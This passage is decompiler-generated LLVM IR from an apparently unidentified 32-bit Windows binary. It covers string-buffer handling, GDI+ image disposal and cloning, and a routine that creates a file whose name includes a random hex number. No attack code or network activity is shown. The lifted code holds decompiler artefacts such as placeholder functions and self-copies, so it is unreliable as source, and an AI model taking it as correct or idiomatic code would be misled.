  %46 = call i32 @__asm_int3(), !insn.addr !97
  %47 = call i32 @__asm_int3(), !insn.addr !98
  %48 = call i32 @__asm_int3(), !insn.addr !99
  %49 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !100
  store i32 %49, i32* %stack_var_-24, align 4, !insn.addr !100
  %50 = load i32, i32* %stack_var_-16, align 4, !insn.addr !101
  %51 = add i32 %ecx.0.reload, 16, !insn.addr !102
  %52 = inttoptr i32 %51 to i32*, !insn.addr !102
  %53 = load i32, i32* %52, align 4, !insn.addr !102
  %54 = icmp ult i32 %53, %50, !insn.addr !103
  br i1 %54, label %dec_label_pc_40496f, label %dec_label_pc_4048f1, !insn.addr !104

dec_label_pc_4048f1:                              ; preds = %dec_label_pc_4048cc
  %55 = sub i32 %53, %50, !insn.addr !105
  %56 = icmp ugt i32 %55, %1
  br i1 %56, label %dec_label_pc_40491f, label %dec_label_pc_4048fc, !insn.addr !106

dec_label_pc_4048fc:                              ; preds = %dec_label_pc_4048f1
  %57 = add i32 %ecx.0.reload, 20, !insn.addr !107
  %58 = inttoptr i32 %57 to i32*, !insn.addr !107
  %59 = load i32, i32* %58, align 4, !insn.addr !107
  %60 = icmp ult i32 %59, 16, !insn.addr !107
  store i32 %50, i32* %52, align 4, !insn.addr !108
  br i1 %60, label %dec_label_pc_404913, label %dec_label_pc_404905, !insn.addr !109

dec_label_pc_404905:                              ; preds = %dec_label_pc_4048fc
  %61 = inttoptr i32 %ecx.0.reload to i32*, !insn.addr !110
  %62 = load i32, i32* %61, align 4, !insn.addr !110
  %63 = add i32 %62, %50, !insn.addr !111
  %64 = inttoptr i32 %63 to i8*, !insn.addr !111
  store i8 0, i8* %64, align 1, !insn.addr !111
  ret i32 %ecx.0.reload, !insn.addr !112

dec_label_pc_404913:                              ; preds = %dec_label_pc_4048fc
  %65 = add i32 %50, %ecx.0.reload, !insn.addr !113
  %66 = inttoptr i32 %65 to i8*, !insn.addr !113
  store i8 0, i8* %66, align 1, !insn.addr !113
  ret i32 %ecx.0.reload, !insn.addr !114

dec_label_pc_40491f:                              ; preds = %dec_label_pc_4048f1
  %67 = icmp eq i32 %1, 0, !insn.addr !115
  store i32 %ecx.0.reload, i32* %merge.reg2mem, !insn.addr !116
  br i1 %67, label %dec_label_pc_4048c3, label %dec_label_pc_404923, !insn.addr !116

dec_label_pc_404923:                              ; preds = %dec_label_pc_40491f
  %68 = add i32 %ecx.0.reload, 20, !insn.addr !117
  %69 = inttoptr i32 %68 to i32*, !insn.addr !117
  %70 = load i32, i32* %69, align 4, !insn.addr !117
  %71 = icmp ult i32 %70, 16, !insn.addr !117
  store i32 %ecx.0.reload, i32* %storemerge3.reg2mem, !insn.addr !118
  br i1 %71, label %dec_label_pc_40492f, label %dec_label_pc_404929, !insn.addr !118

dec_label_pc_404929:                              ; preds = %dec_label_pc_404923
  %72 = inttoptr i32 %ecx.0.reload to i32*, !insn.addr !119
  %73 = load i32, i32* %72, align 4, !insn.addr !119
  store i32 %73, i32* %storemerge3.reg2mem, !insn.addr !120
  br label %dec_label_pc_40492f, !insn.addr !120

dec_label_pc_40492f:                              ; preds = %dec_label_pc_404923, %dec_label_pc_404929
  %74 = sub i32 %53, %1, !insn.addr !121
  %75 = sub i32 %74, %50, !insn.addr !122
  %76 = icmp eq i32 %75, 0, !insn.addr !122
  store i32 %70, i32* %.reg2mem15, !insn.addr !123
  br i1 %76, label %dec_label_pc_404949, label %dec_label_pc_40493b, !insn.addr !123

dec_label_pc_40493b:                              ; preds = %dec_label_pc_40492f
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %77 = add i32 %storemerge3.reload, %50, !insn.addr !124
  %78 = add i32 %77, %1, !insn.addr !125
  %79 = inttoptr i32 %77 to i32*, !insn.addr !126
  %80 = inttoptr i32 %78 to i32*, !insn.addr !126
  %81 = call i32* @_memcpy(i32* %79, i32* %80, i32 %75), !insn.addr !126
  %.pre11 = load i32, i32* %69, align 4
  store i32 %.pre11, i32* %.reg2mem15, !insn.addr !127
  br label %dec_label_pc_404949, !insn.addr !127

dec_label_pc_404949:                              ; preds = %dec_label_pc_40493b, %dec_label_pc_40492f
  %.reload16 = load i32, i32* %.reg2mem15, !insn.addr !128
  %82 = icmp ult i32 %.reload16, 16, !insn.addr !128
  store i32 %74, i32* %52, align 4, !insn.addr !129
  br i1 %82, label %dec_label_pc_404961, label %dec_label_pc_404953, !insn.addr !130

dec_label_pc_404953:                              ; preds = %dec_label_pc_404949
  %83 = inttoptr i32 %ecx.0.reload to i32*, !insn.addr !131
  %84 = load i32, i32* %83, align 4, !insn.addr !131
  %85 = add i32 %84, %74, !insn.addr !132
  %86 = inttoptr i32 %85 to i8*, !insn.addr !132
  store i8 0, i8* %86, align 1, !insn.addr !132
  ret i32 %ecx.0.reload, !insn.addr !133

dec_label_pc_404961:                              ; preds = %dec_label_pc_404949
  %87 = add i32 %74, %ecx.0.reload, !insn.addr !134
  %88 = inttoptr i32 %87 to i8*, !insn.addr !134
  store i8 0, i8* %88, align 1, !insn.addr !134
  store i32 %ecx.0.reload, i32* %merge.reg2mem, !insn.addr !134
  br label %dec_label_pc_4048c3, !insn.addr !134

dec_label_pc_40496f:                              ; preds = %dec_label_pc_4048cc
  %89 = call i32 @"?_Xinvalid_argument@std@@YAXPBD@Z.6"(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_42592c, i32 0, i32 0)), !insn.addr !135
  %90 = call i32 @__asm_int3(), !insn.addr !136
  %91 = call i32 @__asm_int3(), !insn.addr !137
  %92 = call i32 @__asm_int3(), !insn.addr !138
  %93 = call i32 @__asm_int3(), !insn.addr !139
  %94 = call i32 @__asm_int3(), !insn.addr !140
  %95 = call i32 @__asm_int3(), !insn.addr !141
  %96 = call i32 @__asm_int3(), !insn.addr !142
  ret i32 %96, !insn.addr !142
}

define i32 @function_404980(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_404980:
  %ecx.1.reg2mem = alloca i32, !insn.addr !143
  %stack_var_-24.0.reg2mem = alloca i32, !insn.addr !143
  %edi.0.reg2mem = alloca i32, !insn.addr !143
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !144
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !145
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !146
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !147
  %3 = or i32 %arg1, 15, !insn.addr !148
  %4 = icmp ult i32 %3, -2, !insn.addr !149
  store i32 %arg1, i32* %edi.0.reg2mem, !insn.addr !150
  br i1 %4, label %dec_label_pc_4049c1, label %dec_label_pc_4049e8, !insn.addr !150

dec_label_pc_4049c1:                              ; preds = %dec_label_pc_404980
  %5 = add i32 %0, 20, !insn.addr !151
  %6 = inttoptr i32 %5 to i32*, !insn.addr !151
  %7 = load i32, i32* %6, align 4, !insn.addr !151
  %8 = udiv i32 %7, 2, !insn.addr !152
  %9 = udiv i32 %3, 3, !insn.addr !153
  %10 = icmp ugt i32 %8, %9
  store i32 %3, i32* %edi.0.reg2mem, !insn.addr !154
  br i1 %10, label %dec_label_pc_4049d5, label %dec_label_pc_4049e8, !insn.addr !154

dec_label_pc_4049d5:                              ; preds = %dec_label_pc_4049c1
  %11 = add i32 %8, %7, !insn.addr !155
  %12 = sub nuw i32 -2, %8, !insn.addr !156
  %13 = icmp ugt i32 %7, %12
  %spec.store.select = select i1 %13, i32 -2, i32 %11
  store i32 %spec.store.select, i32* %edi.0.reg2mem
  br label %dec_label_pc_4049e8

dec_label_pc_4049e8:                              ; preds = %dec_label_pc_404980, %dec_label_pc_4049d5, %dec_label_pc_4049c1
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %14 = add i32 %edi.0.reload, 1, !insn.addr !157
  %15 = icmp eq i32 %14, 0, !insn.addr !158
  store i32 0, i32* %stack_var_-24.0.reg2mem, !insn.addr !159
  br i1 %15, label %dec_label_pc_404a41, label %dec_label_pc_404a00, !insn.addr !159

dec_label_pc_404a00:                              ; preds = %dec_label_pc_4049e8
  %16 = call i32 @"??2@YAPAXI@Z"(i32 %14), !insn.addr !160
  %17 = icmp eq i32 %16, 0, !insn.addr !161
  %18 = icmp eq i1 %17, false, !insn.addr !162
  store i32 %16, i32* %stack_var_-24.0.reg2mem, !insn.addr !162
  br i1 %18, label %dec_label_pc_404a41, label %dec_label_pc_404a10, !insn.addr !162

dec_label_pc_404a10:                              ; preds = %dec_label_pc_404a00
  %19 = call i32 @"?_Internal_throw_exception@_Concurrent_queue_base_v4@details@Concurrency@@IBEXXZ"(), !insn.addr !163
  %20 = add i32 %arg1, 1, !insn.addr !164
  %21 = call i32 @function_404ae0(i32 %20, i32 ptrtoint (i32* @0 to i32)), !insn.addr !165
  ret i32 4213301, !insn.addr !166

dec_label_pc_404a41:                              ; preds = %dec_label_pc_404a00, %dec_label_pc_4049e8
  %stack_var_-24.0.reload = load i32, i32* %stack_var_-24.0.reg2mem
  %22 = icmp eq i32 %arg2, 0, !insn.addr !167
  %.pre = add i32 %0, 20
  %.pre2 = inttoptr i32 %.pre to i32*
  store i32 %14, i32* %ecx.1.reg2mem, !insn.addr !168
  br i1 %22, label %dec_label_pc_404a90, label %dec_label_pc_404a48, !insn.addr !168

dec_label_pc_404a48:                              ; preds = %dec_label_pc_404a41
  %23 = load i32, i32* %.pre2, align 4, !insn.addr !169
  %24 = icmp ult i32 %23, 16, !insn.addr !169
  %spec.select = select i1 %24, i32 %0, i32 %14
  %25 = call i32 @_memcpy.1(), !insn.addr !170
  store i32 %spec.select, i32* %ecx.1.reg2mem, !insn.addr !171
  br label %dec_label_pc_404a90, !insn.addr !171

dec_label_pc_404a90:                              ; preds = %dec_label_pc_404a41, %dec_label_pc_404a48
  %26 = load i32, i32* %.pre2, align 4, !insn.addr !172
  %27 = icmp ult i32 %26, 16, !insn.addr !172
  br i1 %27, label %dec_label_pc_404aa0, label %dec_label_pc_404a96, !insn.addr !173

dec_label_pc_404a96:                              ; preds = %dec_label_pc_404a90
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %28 = inttoptr i32 %ecx.1.reload to i32*, !insn.addr !174
  call void @_free(i32* %28), !insn.addr !174
  br label %dec_label_pc_404aa0, !insn.addr !175

dec_label_pc_404aa0:                              ; preds = %dec_label_pc_404a96, %dec_label_pc_404a90
  %29 = inttoptr i32 %0 to i8*, !insn.addr !176
  store i8 0, i8* %29, align 1, !insn.addr !176
  %30 = inttoptr i32 %0 to i32*, !insn.addr !177
  store i32 %stack_var_-24.0.reload, i32* %30, align 4, !insn.addr !177
  store i32 %edi.0.reload, i32* %.pre2, align 4, !insn.addr !178
  %31 = add i32 %0, 16, !insn.addr !179
  %32 = inttoptr i32 %31 to i32*, !insn.addr !179
  store i32 %arg2, i32* %32, align 4, !insn.addr !179
  %33 = icmp ult i32 %edi.0.reload, 16, !insn.addr !180
  %spec.select1 = select i1 %33, i32 %0, i32 %stack_var_-24.0.reload
  %34 = add i32 %spec.select1, %arg2, !insn.addr !181
  %35 = inttoptr i32 %34 to i8*, !insn.addr !181
  store i8 0, i8* %35, align 1, !insn.addr !181
  %36 = load i32, i32* %stack_var_-16, align 4, !insn.addr !182
  call void @__writefsdword(i32 0, i32 %36), !insn.addr !183
  ret i32 %stack_var_-24.0.reload, !insn.addr !184
}

define i32 @function_404ae0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_404ae0:
  %ecx.0.reg2mem = alloca i32, !insn.addr !185
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg2, 0, !insn.addr !186
  store i32 0, i32* %ecx.0.reg2mem, !insn.addr !187
  br i1 %1, label %dec_label_pc_404b00, label %dec_label_pc_404af1, !insn.addr !187

dec_label_pc_404af1:                              ; preds = %dec_label_pc_404ae0
  %2 = call i32 @"??2@YAPAXI@Z"(i32 %arg2), !insn.addr !188
  %3 = icmp eq i32 %2, 0, !insn.addr !189
  store i32 %2, i32* %ecx.0.reg2mem, !insn.addr !190
  br i1 %3, label %dec_label_pc_404b06, label %dec_label_pc_404b00, !insn.addr !190

dec_label_pc_404b00:                              ; preds = %dec_label_pc_404af1, %dec_label_pc_404ae0
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  ret i32 %ecx.0.reload, !insn.addr !191

dec_label_pc_404b06:                              ; preds = %dec_label_pc_404af1
  %4 = call i32 @"?_Internal_throw_exception@_Concurrent_queue_base_v4@details@Concurrency@@IBEXXZ"(), !insn.addr !192
  %5 = call i32 @__asm_int3(), !insn.addr !193
  %6 = call i32 @__asm_int3(), !insn.addr !194
  %7 = call i32 @__asm_int3(), !insn.addr !195
  %8 = call i32 @__asm_int3(), !insn.addr !196
  %9 = call i32 @__asm_int3(), !insn.addr !197
  %10 = icmp eq i32 %arg1, 0, !insn.addr !198
  br i1 %10, label %dec_label_pc_404b50, label %dec_label_pc_404b4a, !insn.addr !199

dec_label_pc_404b4a:                              ; preds = %dec_label_pc_404b06
  %11 = inttoptr i32 %arg1 to i32*, !insn.addr !200
  store i32 0, i32* %11, align 4, !insn.addr !200
  br label %dec_label_pc_404b50, !insn.addr !200

dec_label_pc_404b50:                              ; preds = %dec_label_pc_404b4a, %dec_label_pc_404b06
  %12 = call i32 @_rand(), !insn.addr !201
  %13 = ashr i32 %12, 31, !insn.addr !202
  %14 = zext i32 %12 to i64, !insn.addr !203
  %15 = zext i32 %13 to i64, !insn.addr !203
  %16 = mul i64 %15, 4294967296, !insn.addr !203
  %17 = or i64 %16, %14, !insn.addr !203
  %18 = srem i64 %17, 15, !insn.addr !203
  %19 = trunc i64 %18 to i32, !insn.addr !203
  %20 = add i32 %0, 16
  %21 = and i32 %20, -16, !insn.addr !204
  %22 = or i32 %21, 1, !insn.addr !205
  %23 = add i32 %22, %19, !insn.addr !206
  %24 = call i32* @_malloc(i32 %23), !insn.addr !207
  %25 = icmp eq i32* %24, null, !insn.addr !208
  %26 = icmp eq i1 %25, false, !insn.addr !209
  br i1 %26, label %dec_label_pc_404b9e, label %dec_label_pc_404b8d, !insn.addr !209

dec_label_pc_404b8d:                              ; preds = %dec_label_pc_404b50
  %27 = call i32 @"@__security_check_cookie@4"(), !insn.addr !210
  ret i32 %27, !insn.addr !211

dec_label_pc_404b9e:                              ; preds = %dec_label_pc_404b50
  %28 = sub i32 %21, %0, !insn.addr !212
  %29 = call i32* @_memset(i32* %24, i32 %28, i32 %21), !insn.addr !213
  %30 = call i32 @_memcpy.1(), !insn.addr !214
  unreachable
}

define i32 @function_404c70(i8 %arg1) {
dec_label_pc_404c70:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 4, !insn.addr !215
  %2 = inttoptr i32 %1 to i32*, !insn.addr !215
  %3 = load i32, i32* %2, align 4, !insn.addr !215
  %4 = inttoptr i32 %0 to i32*, !insn.addr !216
  store i32 ptrtoint (i32* @global_var_425a2c to i32), i32* %4, align 4, !insn.addr !216
  %5 = inttoptr i32 %3 to i32*, !insn.addr !217
  %6 = call i32 @GdipDisposeImage(i32* %5), !insn.addr !217
  %7 = and i8 %arg1, 1, !insn.addr !218
  %8 = icmp eq i8 %7, 0, !insn.addr !218
  br i1 %8, label %dec_label_pc_404c92, label %dec_label_pc_404c8b, !insn.addr !219

dec_label_pc_404c8b:                              ; preds = %dec_label_pc_404c70
  call void @GdipFree(i32* %4), !insn.addr !220
  br label %dec_label_pc_404c92, !insn.addr !220

dec_label_pc_404c92:                              ; preds = %dec_label_pc_404c8b, %dec_label_pc_404c70
  ret i32 %0, !insn.addr !221
}

define i32 @function_404ca0() {
dec_label_pc_404ca0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !222
  %1 = bitcast i32* %stack_var_-8 to i32**
  %2 = add i32 %0, 4, !insn.addr !223
  %3 = inttoptr i32 %2 to i32*, !insn.addr !223
  %4 = load i32, i32* %3, align 4, !insn.addr !223
  %5 = inttoptr i32 %4 to i32*, !insn.addr !224
  %6 = call i32 @GdipCloneImage(i32* %5, i32** nonnull %1), !insn.addr !224
  %7 = icmp eq i32 %6, 0, !insn.addr !225
  br i1 %7, label %dec_label_pc_404cc2, label %dec_label_pc_404cbf, !insn.addr !226

dec_label_pc_404cbf:                              ; preds = %dec_label_pc_404ca0
  %8 = add i32 %0, 8, !insn.addr !227
  %9 = inttoptr i32 %8 to i32*, !insn.addr !227
  store i32 %6, i32* %9, align 4, !insn.addr !227
  br label %dec_label_pc_404cc2, !insn.addr !227

dec_label_pc_404cc2:                              ; preds = %dec_label_pc_404cbf, %dec_label_pc_404ca0
  %10 = call i32* @GdipAlloc(i32 16), !insn.addr !228
  %11 = icmp eq i32* %10, null, !insn.addr !229
  br i1 %11, label %dec_label_pc_404ce5, label %dec_label_pc_404cce, !insn.addr !230

dec_label_pc_404cce:                              ; preds = %dec_label_pc_404cc2
  %12 = ptrtoint i32* %10 to i32, !insn.addr !228
  %13 = add i32 %0, 8, !insn.addr !231
  %14 = inttoptr i32 %13 to i32*, !insn.addr !231
  %15 = load i32, i32* %14, align 4, !insn.addr !231
  %16 = load i32, i32* %stack_var_-8, align 4, !insn.addr !232
  store i32 ptrtoint (i32* @global_var_425a2c to i32), i32* %10, align 4, !insn.addr !233
  %17 = add i32 %12, 4, !insn.addr !234
  %18 = inttoptr i32 %17 to i32*, !insn.addr !234
  store i32 %16, i32* %18, align 4, !insn.addr !234
  %19 = add i32 %12, 8, !insn.addr !235
  %20 = inttoptr i32 %19 to i32*, !insn.addr !235
  store i32 %15, i32* %20, align 4, !insn.addr !235
  ret i32 %12, !insn.addr !236

dec_label_pc_404ce5:                              ; preds = %dec_label_pc_404cc2
  ret i32 0, !insn.addr !237
}

define i32 @function_405dd0() local_unnamed_addr {
dec_label_pc_405dd0:
  %ecx.1.reg2mem = alloca i32, !insn.addr !238
  %edi.1.reg2mem = alloca i32, !insn.addr !238
  %edx.2.reg2mem = alloca i32, !insn.addr !238
  %eax.2.reg2mem = alloca i32, !insn.addr !238
  %edx.1.reg2mem = alloca i32, !insn.addr !238
  %edi.0.reg2mem = alloca i32, !insn.addr !238
  %edx.0.reg2mem = alloca i32, !insn.addr !238
  %0 = call i1 @__decompiler_undefined_function_3()
  %stack_var_-165 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-335 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %1 = call i128 @__decompiler_undefined_function_2()
  %stack_var_-67 = alloca i32, align 4
  %stack_var_-217 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-216 = alloca i8, align 1
  %stack_var_-215 = alloca i32, align 4
  %stack_var_-115 = alloca i32, align 4
  %stack_var_-164 = alloca i8, align 1
  %stack_var_-163 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i8 0, i8* %stack_var_-164, align 1, !insn.addr !239
  %2 = call i32* @_memset(i32* nonnull %stack_var_-163, i32 0, i32 44), !insn.addr !240
  %3 = call i32* @_memset(i32* nonnull %stack_var_-115, i32 0, i32 99), !insn.addr !241
  store i8 0, i8* %stack_var_-216, align 1, !insn.addr !242
  %4 = call i32* @_memset(i32* nonnull %stack_var_-215, i32 0, i32 49), !insn.addr !243
  store i32 894718009, i32* %stack_var_-116, align 4, !insn.addr !244
  %5 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !245
  store i32 %5, i32* %edx.0.reg2mem, !insn.addr !246
  br label %dec_label_pc_405e52, !insn.addr !246

dec_label_pc_405e52:                              ; preds = %dec_label_pc_405e52, %dec_label_pc_405dd0
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %6 = inttoptr i32 %edx.0.reload to i8*, !insn.addr !247
  %7 = load i8, i8* %6, align 1, !insn.addr !247
  %8 = add i32 %edx.0.reload, 1, !insn.addr !248
  %9 = icmp eq i8 %7, 0, !insn.addr !249
  %10 = icmp eq i1 %9, false, !insn.addr !250
  store i32 %8, i32* %edx.0.reg2mem, !insn.addr !250
  br i1 %10, label %dec_label_pc_405e52, label %dec_label_pc_405e59, !insn.addr !250

dec_label_pc_405e59:                              ; preds = %dec_label_pc_405e52
  %11 = ptrtoint i32* %stack_var_-217 to i32, !insn.addr !251
  store i32 %11, i32* %edi.0.reg2mem, !insn.addr !251
  br label %dec_label_pc_405e62, !insn.addr !251

dec_label_pc_405e62:                              ; preds = %dec_label_pc_405e62, %dec_label_pc_405e59
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %12 = add i32 %edi.0.reload, 1, !insn.addr !252
  %13 = inttoptr i32 %12 to i8*
  %14 = load i8, i8* %13, align 1, !insn.addr !252
  %15 = icmp eq i8 %14, 0, !insn.addr !253
  %16 = icmp eq i1 %15, false, !insn.addr !254
  store i32 %12, i32* %edi.0.reg2mem, !insn.addr !254
  br i1 %16, label %dec_label_pc_405e62, label %dec_label_pc_405e6a, !insn.addr !254

dec_label_pc_405e6a:                              ; preds = %dec_label_pc_405e62
  %17 = sub i32 %8, %5, !insn.addr !255
  %18 = udiv i32 %17, 4, !insn.addr !256
  %19 = bitcast i32* %stack_var_-116 to i8*, !insn.addr !257
  call void @__asm_rep_movsd_memcpy(i8* %13, i8* nonnull %19, i32 %18), !insn.addr !257
  %20 = select i1 %0, i32 -4, i32 4, !insn.addr !257
  %21 = mul i32 %18, %20, !insn.addr !257
  %22 = add i32 %12, %21, !insn.addr !257
  %23 = and i32 %17, 3, !insn.addr !258
  %24 = inttoptr i32 %22 to i8*, !insn.addr !259
  call void @__asm_rep_movsb_memcpy(i8* %24, i8* %24, i32 %23), !insn.addr !259
  %25 = call i32* @CreateFileA(i8* nonnull %stack_var_-216, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !260
  %26 = icmp eq i32* %25, inttoptr (i32 -1 to i32*), !insn.addr !261
  %27 = icmp eq i1 %26, false, !insn.addr !262
  br i1 %27, label %dec_label_pc_405fff, label %dec_label_pc_405ea4, !insn.addr !262

dec_label_pc_405ea4:                              ; preds = %dec_label_pc_405e6a
  %28 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !263
  %29 = call i32* @CreateFileA(i8* nonnull %stack_var_-216, i32 4, i32 1, %_SECURITY_ATTRIBUTES* null, i32 2, i32 128, i32* null), !insn.addr !264
  %30 = call i32* @_memset(i32* nonnull %stack_var_-67, i32 0, i32 49), !insn.addr !265
  %31 = load i128, i128* @global_var_4260b0, align 4, !insn.addr !266
  %32 = call i128 @__asm_movdqa(i128 %31), !insn.addr !266
  call void @__asm_movdqu.10(i128 %1, i128 %32), !insn.addr !267
  %33 = call i32* @GetModuleHandleA(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_425a34, i32 0, i32 0)), !insn.addr !268
  %34 = call i32 @function_406f10(), !insn.addr !269
  %35 = ptrtoint i32* %stack_var_-336 to i32, !insn.addr !270
  store i32 %35, i32* %edx.1.reg2mem, !insn.addr !271
  br label %dec_label_pc_405f20, !insn.addr !271

dec_label_pc_405f20:                              ; preds = %dec_label_pc_405f20, %dec_label_pc_405ea4
  %edx.1.reload = load i32, i32* %edx.1.reg2mem
  %36 = inttoptr i32 %edx.1.reload to i8*, !insn.addr !272
  %37 = load i8, i8* %36, align 1, !insn.addr !272
  %38 = add i32 %edx.1.reload, 1, !insn.addr !273
  %39 = icmp eq i8 %37, 0, !insn.addr !274
  %40 = icmp eq i1 %39, false, !insn.addr !275
  store i32 %38, i32* %edx.1.reg2mem, !insn.addr !275
  br i1 %40, label %dec_label_pc_405f20, label %dec_label_pc_405f27, !insn.addr !275

dec_label_pc_405f27:                              ; preds = %dec_label_pc_405f20
  %41 = ptrtoint i32* %stack_var_-335 to i32, !insn.addr !276
  %42 = sub i32 %38, %41, !insn.addr !277
  %43 = icmp eq i32 %42, 0, !insn.addr !277
  br i1 %43, label %dec_label_pc_405f4e, label %dec_label_pc_405f30.preheader, !insn.addr !278

dec_label_pc_405f30.preheader:                    ; preds = %dec_label_pc_405f27
  %44 = add i32 %42, -1, !insn.addr !279
  store i32 0, i32* %eax.2.reg2mem
  br label %dec_label_pc_405f30

dec_label_pc_405f30:                              ; preds = %dec_label_pc_405f49, %dec_label_pc_405f30.preheader
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %45 = icmp eq i32 %eax.2.reload, 0, !insn.addr !280
  %46 = icmp eq i32 %eax.2.reload, %44, !insn.addr !281
  %or.cond = or i1 %45, %46
  br i1 %or.cond, label %dec_label_pc_405f49, label %dec_label_pc_405f3b, !insn.addr !282

dec_label_pc_405f3b:                              ; preds = %dec_label_pc_405f30
  %47 = add i32 %eax.2.reload, %28
  %48 = add i32 %47, -332, !insn.addr !283
  %49 = inttoptr i32 %48 to i8*, !insn.addr !283
  %50 = load i8, i8* %49, align 1, !insn.addr !283
  %51 = add i32 %47, -161, !insn.addr !284
  %52 = inttoptr i32 %51 to i8*, !insn.addr !284
  store i8 %50, i8* %52, align 1, !insn.addr !284
  br label %dec_label_pc_405f49, !insn.addr !284

dec_label_pc_405f49:                              ; preds = %dec_label_pc_405f3b, %dec_label_pc_405f30
  %53 = add nuw i32 %eax.2.reload, 1, !insn.addr !285
  %exitcond = icmp eq i32 %53, %42
  store i32 %53, i32* %eax.2.reg2mem, !insn.addr !286
  br i1 %exitcond, label %dec_label_pc_405f4e, label %dec_label_pc_405f30, !insn.addr !286

dec_label_pc_405f4e:                              ; preds = %dec_label_pc_405f49, %dec_label_pc_405f27
  %54 = call i32 @GetTickCount(), !insn.addr !287
  call void @_srand(i32 %54), !insn.addr !288
  %55 = call i32 @_rand(), !insn.addr !289
  %56 = ashr i32 %55, 31, !insn.addr !290
  %57 = zext i32 %55 to i64, !insn.addr !291
  %58 = zext i32 %56 to i64, !insn.addr !291
  %59 = mul i64 %58, 4294967296, !insn.addr !291
  %60 = or i64 %59, %57, !insn.addr !291
  %61 = srem i64 %60, 50000, !insn.addr !291
  %62 = trunc i64 %61 to i32, !insn.addr !291
  store i32 0, i32* %stack_var_-16, align 4, !insn.addr !292
  %63 = add i32 %62, 10000, !insn.addr !293
  %64 = bitcast i32* %stack_var_-16 to i8*
  %65 = call i8* @__itoa(i32 %63, i8* nonnull %64, i32 16), !insn.addr !294
  %66 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !295
  store i32 %66, i32* %edx.2.reg2mem, !insn.addr !296
  br label %dec_label_pc_405f90, !insn.addr !296

dec_label_pc_405f90:                              ; preds = %dec_label_pc_405f90, %dec_label_pc_405f4e
  %edx.2.reload = load i32, i32* %edx.2.reg2mem
  %67 = inttoptr i32 %edx.2.reload to i8*, !insn.addr !297
  %68 = load i8, i8* %67, align 1, !insn.addr !297
  %69 = add i32 %edx.2.reload, 1, !insn.addr !298
  %70 = icmp eq i8 %68, 0, !insn.addr !299
  %71 = icmp eq i1 %70, false, !insn.addr !300
  store i32 %69, i32* %edx.2.reg2mem, !insn.addr !300
  br i1 %71, label %dec_label_pc_405f90, label %dec_label_pc_405f97, !insn.addr !300

dec_label_pc_405f97:                              ; preds = %dec_label_pc_405f90
  %72 = ptrtoint i32* %stack_var_-165 to i32, !insn.addr !301
  store i32 %72, i32* %edi.1.reg2mem, !insn.addr !301
  br label %dec_label_pc_405fa0, !insn.addr !301

dec_label_pc_405fa0:                              ; preds = %dec_label_pc_405fa0, %dec_label_pc_405f97
  %edi.1.reload = load i32, i32* %edi.1.reg2mem
  %73 = add i32 %edi.1.reload, 1, !insn.addr !302
  %74 = inttoptr i32 %73 to i8*
  %75 = load i8, i8* %74, align 1, !insn.addr !302
  %76 = icmp eq i8 %75, 0, !insn.addr !303
  %77 = icmp eq i1 %76, false, !insn.addr !304
  store i32 %73, i32* %edi.1.reg2mem, !insn.addr !304
  br i1 %77, label %dec_label_pc_405fa0, label %dec_label_pc_405fa8, !insn.addr !304

dec_label_pc_405fa8:                              ; preds = %dec_label_pc_405fa0
  %78 = sub i32 %69, %66, !insn.addr !305
  %79 = udiv i32 %78, 4, !insn.addr !306
  call void @__asm_rep_movsd_memcpy(i8* %74, i8* nonnull %64, i32 %79), !insn.addr !307
  %80 = mul i32 %79, %20, !insn.addr !307
  %81 = add i32 %73, %80, !insn.addr !307
  %82 = and i32 %78, 3, !insn.addr !308
  %83 = inttoptr i32 %81 to i8*, !insn.addr !309
  call void @__asm_rep_movsb_memcpy(i8* %83, i8* %83, i32 %82), !insn.addr !309
  %84 = ptrtoint i8* %stack_var_-164 to i32, !insn.addr !310
  store i32 %84, i32* %ecx.1.reg2mem, !insn.addr !311
  br label %dec_label_pc_405fc0, !insn.addr !311

dec_label_pc_405fc0:                              ; preds = %dec_label_pc_405fc0, %dec_label_pc_405fa8
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %85 = inttoptr i32 %ecx.1.reload to i8*, !insn.addr !312
  %86 = load i8, i8* %85, align 1, !insn.addr !312
  %87 = add i32 %ecx.1.reload, 1, !insn.addr !313
  %88 = icmp eq i8 %86, 0, !insn.addr !314
  %89 = icmp eq i1 %88, false, !insn.addr !315
  store i32 %87, i32* %ecx.1.reg2mem, !insn.addr !315
  br i1 %89, label %dec_label_pc_405fc0, label %dec_label_pc_405fc7, !insn.addr !315

